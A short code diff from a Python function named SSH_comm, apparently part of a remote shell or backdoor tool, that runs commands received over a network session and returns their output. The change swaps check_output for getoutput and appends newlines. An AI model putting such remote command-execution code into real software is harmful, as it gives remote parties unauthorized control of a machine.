@@ -55,12 +55,12 @@ def SSH_comm():
                         CWD = os.getcwd()
                         session.sendall(f"Changed directory to {CWD}\n")
                     case _:
-                        #print(command.split(" ")[1:])
-                        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+                        #output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+                        output = subprocess.getoutput(command)
                         if (len(output) == 0):
                             session.sendall("[*] Command executed. No shell output.\n")
                         else:
-                            session.sendall(output)
+                            session.sendall(output + "\n")
             except Exception as ex:
                 session.sendall("[!] " + str(ex) + "\n")
     return
